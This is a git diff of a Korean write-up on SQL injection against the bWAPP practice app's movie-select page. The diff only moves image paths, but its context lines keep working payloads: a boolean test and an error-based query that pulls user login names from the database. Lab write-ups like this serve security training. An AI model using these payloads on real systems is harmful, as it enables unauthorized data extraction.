@@ -10,7 +10,7 @@ author_profile: false
 > Low Level 에서는 보안 대책이 적용되어 있지 않다.
 
 ## Level - Low
-![그림 1-1](/assets/image/bwapp/sqli-select/image1.png)
+![그림 1-1](/assets/image/bwapp/injection/sqli-select-archive/sqli-select/image1.png)
 - Select 기능이 존재하고 영화 제목을 질의할 수 있다. 또한 해당 질의의 응답으로 게시판 형식이 출력된다.
 - 출력되는 레코드는 하나의 열만 출력하는 듯 하다.
 - GET 형식으로 데이터가 전송된다.
@@ -21,7 +21,7 @@ bWAPP/sqli_2.php?movie=4&action=go
 
 - GET 형식으로 날라갈 때 파라미터를 보게되면 movie 파라미터에 int 형식으로 전송된다.
 
-![그림 1-2](/assets/image/bwapp/sqli-select/image2.png)
+![그림 1-2](/assets/image/bwapp/injection/sqli-select-archive/sqli-select/image2.png)
 
 ```
 bWAPP/sqli_2.php?movie=1 and 1=1-- &action=go
@@ -53,7 +53,7 @@ bWAPP/sqli_2.php?movie=1 and 1=1-- &action=go
 (SELECT 1 FROM (SELECT COUNT(*),concat((select login from bWAPP.users limit 0,1),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x limit 0,1 )a)--
 ```
 
-![그림 1-3](/assets/image/bwapp/sqli-select/image3.png)
+![그림 1-3](/assets/image/bwapp/injection/sqli-select-archive/sqli-select/image3.png)
 - 성공적으로 데이터를 추출했다.
 
 ## Medium & High
